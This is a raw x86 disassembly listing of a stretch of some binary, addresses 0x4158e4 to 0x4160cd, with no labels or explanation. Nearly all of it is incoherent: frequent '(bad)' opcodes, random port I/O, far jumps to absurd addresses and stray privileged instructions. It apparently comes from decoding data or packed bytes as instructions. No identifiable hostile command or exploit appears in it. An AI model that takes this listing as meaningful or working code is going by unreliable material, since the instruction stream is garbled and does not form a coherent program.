  4158e4:	add    DWORD PTR [edi+0xae3b43],esp
  4158ea:	cmp    esp,0xffffffc2
  4158ed:	sub    BYTE PTR [ebp-0x16],0x2e
  4158f1:	cld    
  4158f2:	rcl    DWORD PTR [edi],1
  4158f4:	mov    ds:0x29e15701,al
  4158f9:	stos   DWORD PTR es:[edi],eax
  4158fa:	and    al,0x70
  4158fc:	retf   0x123c
  4158ff:	xchg   esp,eax
  415900:	sbb    DWORD PTR [ebp+0x58],ebx
  415903:	cmp    bh,0x26
  415906:	(bad)  
  415907:	jo     0x4158a8
  415909:	test   DWORD PTR ds:0x5b77,esp
  41590e:	repz mov edi,0x5fccde84
  415914:	dec    esi
  415915:	xor    ebp,DWORD PTR [ecx-0x67c97774]
  41591b:	add    ah,cl
  41591d:	xchg   BYTE PTR [esi-0x45],al
  415920:	add    ebp,esi
  415922:	out    dx,eax
  415923:	xchg   ebp,eax
  415924:	dec    ecx
  415925:	out    dx,eax
  415926:	inc    esi
  415927:	cwde   
  415928:	sbb    eax,0x9eed2454
  41592d:	in     eax,0xea
  41592f:	mov    ah,0xd1
  415931:	cmp    DWORD PTR [eax+0x5cc7fcdf],ebp
  415937:	pop    edi
  415938:	xchg   ecx,eax
  415939:	add    eax,0xb75e7d56
  41593e:	mov    WORD PTR [eax-0x51e79dbd],cs
  415944:	mov    ah,0x71
  415946:	lock test ecx,edi
  415949:	adc    ch,BYTE PTR [esp+ebx*1-0x59]
  41594d:	cmc    
  41594e:	enter  0xfd3a,0x16
  415952:	xlat   BYTE PTR ds:[ebx]
  415953:	push   ds
  415954:	imul   edx,DWORD PTR [ecx],0x5c2557f3
  41595a:	ficom  DWORD PTR [ecx-0x31]
  41595d:	mov    ebx,0xe2e9de2c
  415962:	push   0x31827f93
  415967:	mov    eax,0x4f0e00fb
  41596c:	test   DWORD PTR [edi-0x6e],0x2fae03da
  415973:	add    BYTE PTR [esi+0x38edb2cb],al
  415979:	add    eax,0x86b6cb7f
  41597e:	xor    edx,DWORD PTR [edx+ebp*2]
  415981:	push   ebx
  415982:	pop    ss
  415983:	sahf   
  415984:	sub    eax,0xd6fef7ab
  415989:	push   ss
  41598a:	and    DWORD PTR [ecx-0x29],ecx
  41598d:	push   edi
  41598e:	inc    eax
  41598f:	adc    BYTE PTR ds:[ebx-0x718f6876],ah
  415996:	(bad)  
  415997:	cld    
  415998:	int    0x5a
  41599a:	jno    0x4159be
  41599c:	inc    ebp
  41599d:	ins    BYTE PTR es:[edi],dx
  41599e:	(bad)  
  41599f:	sar    DWORD PTR [edi+0x3c],1
  4159a2:	retf   0xbce
  4159a5:	lods   al,BYTE PTR ds:[esi]
  4159a6:	rcl    BYTE PTR [ecx-0x7f22afe1],cl
  4159ac:	pusha  
  4159ad:	pop    esp
  4159ae:	enter  0x3ee2,0x2b
  4159b2:	pop    edx
  4159b3:	mov    ebp,0x3a6a067b
  4159b8:	push   ds
  4159b9:	push   ds
  4159ba:	popa   
  4159bb:	loop   0x415968
  4159bd:	mov    eax,ds:0x459a0020
  4159c2:	ror    BYTE PTR [edx],0x64
  4159c5:	push   0x3afe7c17
  4159ca:	rol    DWORD PTR [ebx-0x50],0xc5
  4159ce:	aas    
  4159cf:	mov    al,0x76
  4159d1:	dec    edx
  4159d2:	retf   0x474a
  4159d5:	add    al,BYTE PTR [ecx-0x5517ae09]
  4159db:	or     BYTE PTR [ebx-0x56a4835e],0x20
  4159e2:	jecxz  0x415a23
  4159e4:	loopne 0x4159f7
  4159e6:	pop    edi
  4159e7:	sar    BYTE PTR [eax],0x16
  4159ea:	jecxz  0x4159aa
  4159ec:	mov    ds:0x3cd53d19,al
  4159f1:	xchg   ecx,eax
  4159f2:	mov    edi,0x407043d5
  4159f7:	out    0xf4,al
  4159f9:	xor    dh,BYTE PTR [ebp+0x6f]
  4159fc:	pop    es
  4159fd:	pusha  
  4159fe:	cmp    eax,0xfa749dc3
  415a03:	test   al,0x71
  415a05:	push   eax
  415a06:	pushf  
  415a07:	clc    
  415a08:	jg     0x4159be
  415a0a:	dec    edi
  415a0b:	scas   eax,DWORD PTR es:[edi]
  415a0c:	and    bh,al
  415a0e:	or     eax,0xb2413fc6
  415a13:	jns    0x415a26
  415a15:	adc    al,BYTE PTR [edi-0x32e64dcd]
  415a1b:	rcr    BYTE PTR [eax],0x4
  415a1e:	pop    edx
  415a1f:	fld    TBYTE PTR [ebx]
  415a21:	dec    ebx
  415a22:	jg     0x4159f4
  415a24:	cwde   
  415a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a26:	mov    edi,0x4aaffc27
  415a2b:	cli    
  415a2c:	mov    bl,ah
  415a2e:	mov    dl,0x64
  415a30:	cs xchg ebp,eax
  415a32:	stos   DWORD PTR es:[edi],eax
  415a33:	pop    ecx
  415a34:	loop   0x4159df
  415a36:	mul    DWORD PTR [edi]
  415a38:	test   DWORD PTR [ebx+0x7b],0xf90eacce
  415a3f:	push   esp
  415a40:	aad    0xa1
  415a42:	pop    edx
  415a43:	and    BYTE PTR [ebp-0x755689a4],ch
  415a49:	jo     0x4159e1
  415a4b:	(bad)  
  415a4c:	and    BYTE PTR [eax+0x61e327e6],dh
  415a52:	stos   BYTE PTR es:[edi],al
  415a53:	aas    
  415a54:	jle    0x415a00
  415a56:	push   edx
  415a57:	add    eax,0x980138dc
  415a5c:	lods   al,BYTE PTR ds:[esi]
  415a5d:	jmp    0x415a3c
  415a5f:	jl     0x415aba
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	and    cl,BYTE PTR [edx-0x61]
  415a65:	dec    edi
  415a66:	loopne 0x415a9e
  415a68:	dec    esi
  415a69:	inc    esi
  415a6a:	shl    DWORD PTR [ebp-0x70],1
  415a6d:	mov    ebp,0xabad476
  415a72:	(bad)  
  415a73:	jmp    0x415aa7
  415a75:	push   es
  415a76:	add    BYTE PTR [ebp-0x1dfcdded],dl
  415a7c:	pusha  
  415a7d:	xchg   BYTE PTR [esi+0x70937160],dl
  415a83:	shl    DWORD PTR [ecx+0xa],1
  415a86:	adc    DWORD PTR [ecx-0x6],eax
  415a89:	mov    ebx,0x848dd133
  415a8e:	add    bl,BYTE PTR [edx+esi*2-0x2016ffce]
  415a95:	add    al,BYTE PTR [eax]
  415a97:	add    BYTE PTR [edx],ch
  415a99:	push   eax
  415a9a:	fdivr  QWORD PTR [edx+ebp*2+0x616eaabc]
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	mov    edx,0xb8c5e31a
  415aa9:	or     eax,0x7eb9707f
  415aae:	jo     0x415b20
  415ab0:	xor    eax,0x5e3e641
  415ab5:	inc    edx
  415ab6:	sahf   
  415ab7:	inc    ebp
  415ab8:	jnp    0x415a3f
  415aba:	(bad)  
  415abb:	scas   al,BYTE PTR es:[edi]
  415abc:	jne    0x415aff
  415abe:	jle    0x415a44
  415ac0:	sub    DWORD PTR [esi],edi
  415ac2:	jmp    0x306b:0xa4e40462
  415ac9:	out    dx,eax
  415aca:	mov    esi,ecx
  415acc:	lods   al,BYTE PTR ds:[esi]
  415acd:	pop    ss
  415ace:	jl     0x415b4c
  415ad0:	nop
  415ad1:	je     0x415ae6
  415ad3:	in     eax,dx
  415ad4:	mov    eax,0xb389f489
  415ad9:	cmp    DWORD PTR [edx+esi*2],0xf543a7d6
  415ae0:	pop    ebx
  415ae1:	mov    ebp,0x294b8c08
  415ae6:	iret   
  415ae7:	mov    al,ds:0xf0adf1e9
  415aec:	retf   0x7d12
  415aef:	jp     0x415af1
  415af1:	bound  edx,QWORD PTR [edx]
  415af3:	mov    eax,0xbe0c3c23
  415af8:	jbe    0x415afd
  415afa:	out    dx,al
  415afb:	(bad)  [esi-0x4c948488]
  415b01:	adc    edx,eax
  415b03:	mov    DWORD PTR [edx+0x57a8b921],eax
  415b09:	jg     0x415b6e
  415b0b:	inc    esp
  415b0c:	pop    eax
  415b0d:	inc    edi
  415b0e:	dec    ebx
  415b0f:	aaa    
  415b10:	popf   
  415b11:	call   0xf2781160
  415b16:	push   ebx
  415b17:	cli    
  415b18:	and    edx,DWORD PTR [ecx+0x5d]
  415b1b:	sub    eax,0x4bed3ef2
  415b20:	outs   dx,DWORD PTR ds:[esi]
  415b21:	jg     0x415b59
  415b23:	adc    esp,DWORD PTR [ecx+0x363abf14]
  415b29:	fidiv  DWORD PTR [edi-0x8]
  415b2c:	sbb    al,ch
  415b2e:	push   ebx
  415b2f:	test   eax,0xcb45c08a
  415b34:	jae    0x415ae3
  415b36:	inc    esi
  415b37:	adc    dh,0x2f
  415b3a:	in     eax,0x29
  415b3c:	cld    
  415b3d:	aam    0xf6
  415b3f:	dec    esp
  415b40:	shl    ecx,1
  415b42:	shr    BYTE PTR gs:[eax+0x78e7d693],cl
  415b49:	mov    eax,ds:0x8e0d1a60
  415b4e:	inc    ecx
  415b4f:	call   eax
  415b51:	add    ebp,DWORD PTR [edx-0x56]
  415b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b55:	and    ebx,eax
  415b57:	mov    dl,0xed
  415b59:	imul   ebp,DWORD PTR [ebx],0xfffffffb
  415b5c:	push   edi
  415b5d:	out    0x50,al
  415b5f:	fcos   
  415b61:	and    DWORD PTR [eax+eax*1],ecx
  415b64:	out    0xe9,eax
  415b66:	cmp    ebx,ebp
  415b68:	sub    DWORD PTR [esp+ecx*1+0x2b],0x7ceb00f3
  415b70:	sub    ecx,DWORD PTR [esp+eiz*8]
  415b73:	pop    ecx
  415b74:	xchg   DWORD PTR [edx+0x7c],eax
  415b77:	mov    ch,0x84
  415b79:	pop    ds
  415b7a:	sub    BYTE PTR [esi+0x69d70aca],bl
  415b80:	mov    dh,0xc8
  415b82:	mov    ecx,0x46ba0087
  415b87:	jmp    0xaa541fc0
  415b8c:	mov    ds:0x5d377729,eax
  415b91:	pop    ebp
  415b92:	jnp    0x415b5d
  415b94:	cwde   
  415b95:	pop    ss
  415b96:	pop    ebx
  415b97:	lds    ebx,FWORD PTR [ebx]
  415b99:	jle    0x415b63
  415b9b:	in     eax,dx
  415b9c:	pop    ss
  415b9d:	call   0x2db6:0x8c1c7e5a
  415ba4:	mov    ebx,0x74047d7d
  415ba9:	sub    dl,BYTE PTR [ecx-0x515063d2]
  415baf:	addr16 push 0x160a9ecc
  415bb5:	xchg   edx,eax
  415bb6:	push   ebp
  415bb7:	add    ecx,DWORD PTR [eax-0x75aca9f4]
  415bbd:	jbe    0x415bdd
  415bbf:	in     eax,0x70
  415bc1:	in     al,dx
  415bc2:	call   0x2772:0x1661d06c
  415bc9:	pop    edx
  415bca:	test   al,bl
  415bcc:	jno    0x415bf6
  415bce:	test   al,0xf0
  415bd0:	jge    0x415c13
  415bd2:	popa   
  415bd3:	data16 sar BYTE PTR [esi],cl
  415bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bd7:	nop
  415bd8:	mov    edx,0xc6c04ec6
  415bdd:	add    al,0x9b
  415bdf:	dec    edi
  415be0:	aaa    
  415be1:	cmp    DWORD PTR [ebx+0x1c656b02],esi
  415be7:	outs   dx,BYTE PTR ds:[esi]
  415be8:	loop   0x415be9
  415bea:	test   al,0x87
  415bec:	(bad)  
  415bed:	sti    
  415bee:	pop    ebp
  415bef:	sub    DWORD PTR [eax+esi*8],edx
  415bf2:	jge    0x415c1d
  415bf4:	dec    esp
  415bf5:	dec    DWORD PTR [ebx+0x60]
  415bf8:	dec    eax
  415bf9:	in     al,dx
  415bfa:	mov    dl,0xa8
  415bfc:	add    ecx,0xffffffb1
  415bff:	sub    DWORD PTR [esi-0x66a6a31a],ebp
  415c05:	ja     0x415b8f
  415c07:	xor    eax,0x770a00d
  415c0c:	jnp    0x415c6a
  415c0e:	sbb    dl,BYTE PTR [ebx+0x41]
  415c11:	cdq    
  415c12:	mov    eax,0x72766b42
  415c17:	ja     0x415c71
  415c19:	sar    DWORD PTR [ecx+0x4387d433],1
  415c1f:	push   esp
  415c20:	mov    DWORD PTR [edi],esi
  415c22:	inc    esp
  415c23:	cmp    dh,BYTE PTR [ebx]
  415c25:	pusha  
  415c26:	jo     0x415c85
  415c28:	ja     0x415c82
  415c2a:	retf   0x7d9e
  415c2d:	mov    al,ds:0x2a59d3f2
  415c32:	test   eax,0xb06be567
  415c37:	lods   eax,DWORD PTR ds:[esi]
  415c38:	push   edx
  415c39:	xor    edi,DWORD PTR [ebp+0x7b]
  415c3c:	inc    esi
  415c3d:	cdq    
  415c3e:	shl    BYTE PTR [esp+edx*8],cl
  415c41:	push   edx
  415c42:	das    
  415c43:	dec    ebx
  415c44:	das    
  415c45:	mov    esi,0x9f7d060f
  415c4a:	call   0x39410b4b
  415c4f:	sbb    cl,BYTE PTR [esp]
  415c52:	test   DWORD PTR [ecx+0x1cad8064],eax
  415c58:	call   0xd85813e4
  415c5d:	mov    dh,0xb9
  415c5f:	lahf   
  415c60:	xchg   edi,eax
  415c61:	dec    esi
  415c62:	or     esi,DWORD PTR [ebp+0x19]
  415c65:	push   0xffffff90
  415c67:	sbb    eax,DWORD PTR [edi]
  415c69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c6a:	loope  0x415c73
  415c6c:	mov    al,ds:0xa44d878
  415c71:	mov    dh,0x2c
  415c73:	adc    eax,0x64940e25
  415c78:	xor    al,BYTE PTR ds:[edx*2-0x1b369ee2]
  415c80:	or     BYTE PTR [ecx],dh
  415c82:	or     bh,ah
  415c84:	jmp    0x88f46f2d
  415c89:	mov    BYTE PTR [ebp-0xf],bh
  415c8c:	ficomp WORD PTR [edx]
  415c8e:	sbb    al,0x32
  415c90:	popa   
  415c91:	in     eax,0xcb
  415c93:	cs fwait
  415c95:	or     ch,al
  415c97:	pop    ebx
  415c98:	and    BYTE PTR [edx-0x7cad1f96],0x43
  415c9f:	lock sub esp,DWORD PTR [ebp*1-0x373bc673]
  415ca7:	lahf   
  415ca8:	push   eax
  415ca9:	jle    0x415d08
  415cab:	ss push ecx
  415cad:	jnp    0x415c45
  415caf:	jge    0x415cab
  415cb1:	loop   0x415cb6
  415cb3:	hlt    
  415cb4:	jmp    0x415c43
  415cb6:	pop    ecx
  415cb7:	sar    DWORD PTR [ecx],cl
  415cb9:	pop    eax
  415cba:	xor    edi,ebx
  415cbc:	or     edx,DWORD PTR [ecx-0x4a]
  415cbf:	mov    BYTE PTR ds:0x2d991c8d,ah
  415cc5:	push   ss
  415cc6:	fwait
  415cc7:	pop    es
  415cc8:	adc    DWORD PTR [esi+0x53],edi
  415ccb:	or     bh,bl
  415ccd:	icebp  
  415cce:	fs add al,0xfb
  415cd1:	cmp    al,0x3f
  415cd3:	clc    
  415cd4:	inc    edx
  415cd5:	out    0xc7,eax
  415cd7:	sbb    ch,BYTE PTR [esi-0x6e]
  415cda:	push   esp
  415cdb:	xchg   ebp,eax
  415cdc:	ret    
  415cdd:	scas   eax,DWORD PTR es:[edi]
  415cde:	sub    al,cl
  415ce0:	push   eax
  415ce1:	adc    al,0xf4
  415ce3:	pop    es
  415ce4:	rol    DWORD PTR [eax+0x197b9da5],cl
  415cea:	in     al,dx
  415ceb:	mov    ebx,0x4576aad2
  415cf0:	jb     0x415d4f
  415cf2:	xlat   BYTE PTR ds:[ebx]
  415cf3:	out    0x3f,al
  415cf5:	bound  ebx,QWORD PTR [esi+0x6f]
  415cf8:	repnz fiadd WORD PTR [ecx+0x1c]
  415cfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cfd:	(bad)  
  415cfe:	cli    
  415cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d00:	repnz das 
  415d02:	and    dh,cl
  415d04:	cmp    al,0x38
  415d06:	mov    ah,0xc7
  415d08:	sub    al,0x4f
  415d0a:	mov    ecx,DWORD PTR [esi+ebx*4]
  415d0d:	adc    eax,0xa6089857
  415d12:	mov    ecx,0xf11bff91
  415d17:	push   ebx
  415d19:	fst    QWORD PTR [ebx-0x66]
  415d1c:	call   0x9964ca8a
  415d21:	invd   
  415d23:	enter  0x8456,0x34
  415d27:	clc    
  415d28:	rcl    BYTE PTR [edi+0x1a],cl
  415d2b:	ret    0x96d2
  415d2e:	inc    edx
  415d2f:	jbe    0x415d73
  415d31:	lods   al,BYTE PTR ds:[esi]
  415d32:	mov    bl,0xd8
  415d34:	jmp    0x3dffeaa7
  415d39:	fmul   DWORD PTR [ebp+0x73]
  415d3c:	arpl   WORD PTR [eax],ax
  415d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d3f:	cld    
  415d40:	call   0xf63c:0x4b17f8eb
  415d47:	daa    
  415d48:	pop    ds
  415d49:	into   
  415d4a:	jnp    0x415cfe
  415d4c:	jmp    0xaf06:0xb5fcb24e
  415d53:	inc    edi
  415d54:	ins    BYTE PTR es:[edi],dx
  415d55:	(bad)  
  415d56:	jo     0x415d8e
  415d58:	mov    ebx,0x7a89e76c
  415d5d:	adc    BYTE PTR [ecx+0x36f49b6],0xd5
  415d64:	ins    BYTE PTR es:[edi],dx
  415d65:	add    DWORD PTR [eax],ecx
  415d67:	mov    DWORD PTR [esi-0x64a771f1],ebx
  415d6d:	sbb    al,0xef
  415d6f:	or     BYTE PTR [eax-0x49],ch
  415d72:	push   cs
  415d73:	int    0x49
  415d75:	push   ecx
  415d76:	mov    edx,DWORD PTR cs:[ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	push   DWORD PTR [eax+0xa8156bb]
  415d9a:	jg     0x415e0c
  415d9c:	mov    ecx,0xda70707e
  415da1:	mov    dh,0x9b
  415da3:	mov    eax,0x9c874fdf
  415da8:	mov    bl,0x9d
  415daa:	pop    edi
  415dab:	scas   al,BYTE PTR es:[edi]
  415dac:	fstp   st(0)
  415dae:	sahf   
  415daf:	scas   al,BYTE PTR es:[edi]
  415db0:	cdq    
  415db1:	dec    ebx
  415db2:	mov    eax,0x71ede04c
  415db7:	jmp    0x66af:0x5911d474
  415dbe:	das    
  415dbf:	mov    ebp,0xc4b1183b
  415dc4:	jmp    0x415e31
  415dc6:	pop    ax
  415dc8:	add    BYTE PTR [ecx-0x25],bl
  415dcb:	and    al,0xb2
  415dcd:	mov    ch,BYTE PTR [eax-0x79]
  415dd0:	xchg   esi,eax
  415dd1:	call   0xc470:0xa06a7ca3
  415dd8:	xchg   BYTE PTR [edx],bl
  415dda:	or     DWORD PTR [ebx+0x41],0xfffffff5
  415dde:	lds    esi,FWORD PTR [ebx+0x48]
  415de1:	ds dec eax
  415de3:	mov    ebp,ebp
  415de5:	jo     0x415d9a
  415de7:	jne    0x415e02
  415de9:	add    al,0x7a
  415deb:	xchg   esi,eax
  415dec:	sub    DWORD PTR [ecx+0x28c19138],0xffffff8c
  415df3:	pop    ss
  415df4:	cmp    BYTE PTR [edx+edi*2+0x49],0x77
  415df9:	sub    ebp,DWORD PTR [ebx-0x37]
  415dfc:	push   0x9a0f324e
  415e01:	jmp    0x415d85
  415e03:	rcl    BYTE PTR [ebx],1
  415e05:	or     BYTE PTR [esi+0x3c],cl
  415e08:	in     eax,0x57
  415e0a:	shl    BYTE PTR [ebp-0x8],cl
  415e0d:	xor    al,0x55
  415e0f:	or     BYTE PTR [ecx-0x50],bl
  415e12:	mov    es,esi
  415e14:	sub    edx,DWORD PTR [ecx-0x1b84c799]
  415e1a:	cmp    al,0x9d
  415e1c:	into   
  415e1d:	mov    ebp,0xb2911d32
  415e22:	pop    ecx
  415e23:	stc    
  415e24:	(bad)  
  415e25:	fwait
  415e26:	ja     0x415e15
  415e28:	les    esi,FWORD PTR [ebp+0x29]
  415e2b:	aad    0xb5
  415e2d:	lock (bad) 
  415e2f:	adc    eax,0xb31c534
  415e34:	dec    esi
  415e35:	out    dx,eax
  415e36:	cli    
  415e37:	lahf   
  415e38:	fsubr  DWORD PTR [eax+eax*8]
  415e3b:	mov    dl,0x55
  415e3d:	cmp    dh,BYTE PTR [edi+0x4c4626e7]
  415e43:	jmp    0x415e74
  415e45:	outs   dx,BYTE PTR ds:[esi]
  415e46:	fcmovnbe st,st(5)
  415e48:	sub    DWORD PTR [ebp+eiz*2-0x263e21f0],edx
  415e4f:	jmp    0x415e22
  415e51:	mov    ch,al
  415e53:	enter  0x3713,0x5f
  415e57:	jl     0x415e8e
  415e59:	push   0xffffff98
  415e5b:	cmp    al,0xd7
  415e5d:	cs push es
  415e5f:	loopne 0x415ed0
  415e61:	xchg   edi,eax
  415e62:	test   eax,ebp
  415e64:	mov    ebx,0x75f6b5
  415e69:	mov    cl,BYTE PTR [ebp-0x32a09c24]
  415e6f:	mov    ebp,0x96698c8e
  415e74:	jmp    0xfbb2:0x190a5e40
  415e7b:	leave  
  415e7c:	mov    dl,0x63
  415e7e:	out    0x3,al
  415e80:	pop    esp
  415e81:	push   edi
  415e82:	ret    
  415e83:	mov    bl,0x25
  415e85:	mov    ds:0xaeda49d4,al
  415e8a:	mov    ah,0xbe
  415e8c:	enter  0xa99f,0x2
  415e90:	xlat   BYTE PTR ds:[ebx]
  415e91:	inc    eax
  415e92:	pop    ebp
  415e93:	and    DWORD PTR [ebx-0x6faa3a5f],esp
  415e99:	fwait
  415e9a:	out    dx,eax
  415e9b:	jecxz  0x415edb
  415e9d:	mov    ds,WORD PTR [esp+ecx*8+0x75]
  415ea1:	mov    ds:0xcd9ee0af,al
  415ea6:	dec    esp
  415ea7:	aam    0xc5
  415ea9:	jno    0x415ee6
  415eab:	lds    eax,FWORD PTR [edi]
  415ead:	es retf 0x75c3
  415eb1:	retf   0xa27a
  415eb4:	pop    DWORD PTR [edx-0x425e3093]
  415eba:	pop    eax
  415ebb:	add    eax,DWORD PTR [eax+0x4de9b46a]
  415ec1:	sub    al,ch
  415ec3:	add    BYTE PTR [edx+0x73],ch
  415ec6:	pop    ebp
  415ec7:	iret   
  415ec8:	xchg   esp,eax
  415ec9:	aad    0xcc
  415ecb:	or     edi,DWORD PTR [ebp-0x55a9d43f]
  415ed1:	inc    esp
  415ed2:	mov    eax,0x4de1667
  415ed7:	outs   dx,DWORD PTR ds:[si]
  415ed9:	add    dl,ch
  415edb:	pop    edx
  415edc:	jmp    0x1fbc:0x45692d90
  415ee3:	retf   
  415ee4:	cmp    DWORD PTR [edx],eax
  415ee6:	adc    BYTE PTR [esi],ch
  415ee8:	ror    BYTE PTR [edx],cl
  415eea:	dec    edi
  415eeb:	scas   eax,DWORD PTR es:[edi]
  415eec:	call   0x46a8:0xe0b430c7
  415ef3:	pop    es
  415ef4:	lock (bad) 
  415ef6:	push   0xffffffb8
  415ef8:	sbb    edi,eax
  415efa:	mov    ds:0x6ca9c07a,al
  415eff:	leave  
  415f00:	dec    ecx
  415f01:	pop    esi
  415f02:	inc    ecx
  415f03:	lahf   
  415f04:	or     bl,ah
  415f06:	lods   al,BYTE PTR ds:[esi]
  415f07:	retf   0x3626
  415f0a:	rol    BYTE PTR [ebx-0x13],cl
  415f0d:	inc    ecx
  415f0e:	sbb    al,0x4b
  415f10:	aaa    
  415f11:	jmp    0x4afb9e34
  415f16:	inc    esp
  415f17:	daa    
  415f18:	out    dx,al
  415f19:	xchg   ebx,eax
  415f1a:	fsub   st(6),st
  415f1c:	sbb    eax,0xcaad8da5
  415f21:	test   BYTE PTR [edx-0x23],bh
  415f24:	add    eax,0x45244890
  415f29:	adc    BYTE PTR [ebx+0x324b1373],al
  415f2f:	scas   al,BYTE PTR es:[edi]
  415f30:	sub    ecx,DWORD PTR [ebx-0x70]
  415f33:	call   0xe62ad144
  415f38:	cmp    eax,0x65c6b03c
  415f3d:	or     al,0x9
  415f3f:	mov    ds:0x4bfdc420,eax
  415f44:	popa   
  415f45:	sbb    BYTE PTR [eax-0x72b2d44b],ah
  415f4b:	dec    esp
  415f4c:	push   es
  415f4d:	out    dx,al
  415f4e:	mov    BYTE PTR [ecx-0x74],bl
  415f51:	push   es
  415f52:	stos   BYTE PTR es:[edi],al
  415f53:	push   eax
  415f54:	sahf   
  415f55:	cwde   
  415f56:	arpl   WORD PTR [esi],si
  415f58:	pushf  
  415f59:	cmp    DWORD PTR [eax-0x116035cb],eax
  415f5f:	inc    ecx
  415f60:	sub    BYTE PTR [edx-0x23],dl
  415f63:	(bad)  
  415f64:	aaa    
  415f65:	cwde   
  415f66:	push   esp
  415f67:	pop    ebx
  415f68:	xchg   edi,eax
  415f69:	cmp    bh,BYTE PTR [edx+0x652123a2]
  415f6f:	mov    edx,0xf3d56e31
  415f74:	mov    BYTE PTR gs:[ebx+edx*1+0x108a646f],bh
  415f7c:	sub    BYTE PTR [eax+0x39761c36],al
  415f82:	popa   
  415f83:	ja     0x415f66
  415f85:	or     DWORD PTR [ebx+0x20],edx
  415f88:	mov    bl,0xb0
  415f8a:	cmp    edi,DWORD PTR [edx-0x27d38f98]
  415f90:	aaa    
  415f91:	lods   al,BYTE PTR ds:[esi]
  415f92:	mov    ecx,0xb90eae8a
  415f97:	popf   
  415f98:	xor    al,0x11
  415f9a:	test   BYTE PTR [eax+esi*8-0x1d],ch
  415f9e:	add    BYTE PTR [ebp-0x51],bh
  415fa1:	jle    0x415f3d
  415fa3:	adc    DWORD PTR [edx+ebp*2+0x23],0xffffff8f
  415fa8:	into   
  415fa9:	loopne 0x415f5f
  415fab:	aad    0xcc
  415fad:	adc    bh,al
  415faf:	nop
  415fb0:	lods   al,BYTE PTR ds:[esi]
  415fb1:	stos   BYTE PTR es:[edi],al
  415fb2:	adc    ch,ah
  415fb4:	push   ebp
  415fb5:	rep lods al,BYTE PTR ds:[esi]
  415fb7:	ror    DWORD PTR [ebp+0x28],cl
  415fba:	xchg   DWORD PTR [ebp+0x690b9742],edi
  415fc0:	xor    eax,0x89dc46c7
  415fc5:	sbb    DWORD PTR [eax+0x3c7b5016],0xe00bce43
  415fcf:	jnp    0x415fcf
  415fd1:	lods   eax,DWORD PTR ds:[esi]
  415fd2:	sahf   
  415fd3:	pop    ebp
  415fd4:	popf   
  415fd5:	sar    al,0xe3
  415fd8:	shr    DWORD PTR [ebp-0x33a25204],0x72
  415fdf:	jae    0x415fb8
  415fe1:	add    eax,0x695a797a
  415fe6:	add    edi,DWORD PTR [edx-0x14190137]
  415fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fed:	jl     0x415fed
  415fef:	push   esi
  415ff0:	mov    dl,0x9c
  415ff2:	xchg   ebx,eax
  415ff3:	jne    0x415fdb
  415ff5:	add    BYTE PTR [edi],0x5c
  415ff8:	adc    al,0x6a
  415ffa:	jno    0x416069
  415ffc:	repnz pop ss
  415ffe:	nop    DWORD PTR [edx-0x3c]
  416002:	fdiv   QWORD PTR [eax-0x1185e08f]
  416008:	daa    
  416009:	xchg   edi,eax
  41600a:	lods   eax,DWORD PTR ds:[esi]
  41600b:	mov    dh,0xba
  41600d:	sub    BYTE PTR [esi+0x5055d8dc],al
  416013:	jb     0x41602f
  416015:	dec    ebp
  416016:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  416018:	daa    
  416019:	fidiv  DWORD PTR [ebx-0x14]
  41601c:	xor    edi,DWORD PTR [edi+eax*8-0x796510b2]
  416023:	pusha  
  416024:	dec    ecx
  416025:	ds push ds
  416027:	xchg   ecx,eax
  416028:	pop    edx
  416029:	or     eax,0x6989f095
  41602e:	sbb    BYTE PTR [eax],al
  416030:	add    ebx,DWORD PTR [esi+0x66fc5f3f]
  416036:	sti    
  416037:	cs gs xchg ebp,eax
  41603a:	push   0x79
  41603c:	(bad)  
  41603d:	std    
  41603e:	shl    BYTE PTR [esi+0x41d4b5ba],cl
  416044:	adc    DWORD PTR [edx+edi*1],0xffffffa5
  416048:	(bad)  
  416049:	test   DWORD PTR [esi],0x820d3fa4
  41604f:	mov    ds:0x51d66dc7,eax
  416054:	nop
  416055:	nop
  416056:	jns    0x416055
  416058:	mov    ds:0xd52f29b1,eax
  41605d:	imul   ebp,DWORD PTR [eax+0x1c618d8f],0x3f
  416064:	mov    ebx,0x558b4034
  416069:	or     BYTE PTR [ebx],dh
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x41608d
  41609a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41609b:	popf   
  41609c:	fmulp  st(2),st
  41609e:	pop    ss
  41609f:	jg     0x416111
  4160a1:	mov    ecx,0x7d70707e
  4160a6:	in     eax,dx
  4160a7:	sub    cl,al
  4160a9:	arpl   sp,sp
  4160ab:	ret    0x828f
  4160ae:	pushf  
  4160af:	cmp    bl,BYTE PTR [edi+0xed558d5]
  4160b5:	or     dl,0x18
  4160b8:	mov    ds:0x726016b6,al
  4160bd:	sbb    BYTE PTR [eax],dh
  4160bf:	pop    ds
  4160c0:	aam    0x22
  4160c2:	add    al,0xfa
  4160c4:	jmp    0x918e:0x70699c34
  4160cb:	mov    ebp,es
  4160cd:	dec    eax
